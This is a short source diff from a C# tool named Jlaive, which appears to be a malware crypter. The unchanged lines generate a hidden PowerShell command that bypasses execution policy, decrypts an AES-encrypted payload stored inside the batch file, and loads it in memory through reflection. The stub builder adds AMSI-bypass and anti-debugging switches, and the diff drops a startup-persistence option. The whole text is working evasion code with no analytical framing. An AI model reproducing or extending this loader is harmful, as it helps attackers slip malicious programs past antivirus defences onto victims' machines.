@@ -21,7 +21,7 @@ namespace Jlaive
             return $"%~nx0.exe -noprofile {(hidden ? "-windowstyle hidden" : string.Empty)} -executionpolicy bypass -command ${varname} = [System.IO.File]::ReadAllText('%~f0').Split([Environment]::NewLine);${varname2} = ${varname}[${varname}.Length - 1];${srcvarname} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{srcclass}'));Add-Type -TypeDefinition ${srcvarname};[System.Reflection.Assembly]::Load([{classname}]::{functionname2}([{classname}]::{functionname}([System.Convert]::FromBase64String(${varname2}), [System.Convert]::FromBase64String('{Convert.ToBase64String(key)}'), [System.Convert]::FromBase64String('{Convert.ToBase64String(iv)}')))).EntryPoint.Invoke($null, (, [string[]] ('%*')))";
         }
 
-        public static string CreateCS(byte[] key, byte[] iv, bool bamsi, bool antidebug, bool startup, Random rng)
+        public static string CreateCS(byte[] key, byte[] iv, bool bamsi, bool antidebug, Random rng)
         {
             string namespacename = RandomString(10, rng);
             string classname = RandomString(10, rng);
@@ -45,7 +45,6 @@ namespace Jlaive
 
             if (bamsi) stub += "#define AMSI_BYPASS\n";
             if (antidebug) stub += "#define ANTI_DEBUG\n";
-            if (startup) stub += "#define STARTUP\n";
             stubcode = stubcode.Replace("namespace_name", namespacename);
             stubcode = stubcode.Replace("class_name", classname);
             stubcode = stubcode.Replace("aesfunction_name", aesfunction);
